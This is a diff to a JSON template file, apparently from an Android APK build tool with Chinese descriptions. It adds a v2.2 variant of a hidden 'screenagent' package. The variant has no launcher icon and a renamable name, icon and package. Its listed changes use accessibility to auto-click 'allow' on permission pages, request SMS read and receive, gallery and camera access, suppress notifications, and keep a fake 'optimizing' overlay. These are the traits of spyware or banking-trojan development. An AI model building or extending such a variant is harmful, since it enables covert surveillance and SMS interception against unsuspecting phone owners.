@@ -2,14 +2,25 @@
   "templates": [
     {
       "id": "src-2.1",
-      "name": "v2.1 · B 包（工作端）",
+      "name": "v2.1 · B 包（对照版）",
       "versionName": "2.1",
       "versionCode": 210,
       "sourceDir": "apk-project/project",
       "kind": "screenagent",
       "visibleLauncher": false,
       "resourceStyle": "semantic",
-      "description": "从 apktool smali 工程源码编译：工作端无桌面图标（装完由 A 包拉起），应用名/图标/版本/包名/线路均可改，构建时去掉 LAUNCHER intent-filter。"
+      "description": "原版样本源码（未加任何改动），只补了被 .gitignore 误伤的 34 个 androidx.constraintlayout.core.state 类。用作 2.2 的对照。"
+    },
+    {
+      "id": "src-2.2",
+      "name": "v2.2 · B 包（权限/通知/电池改动）",
+      "versionName": "2.2",
+      "versionCode": 220,
+      "sourceDir": "apk-project/project-2.2",
+      "kind": "screenagent",
+      "visibleLauncher": false,
+      "resourceStyle": "semantic",
+      "description": "在 2.1 基础上改动：无障碍连上后延迟拉权限页、自动点允许（ڝږ؁ڋ/ڤ）、申请短信(读+收)/相册/相机、不申请通知并关闭前台通知渠道、电池白名单跳转默认关闭（battery_grant）、保留原版“优化中”遮罩。"
     },
     {
       "id": "installer-1.3.1",
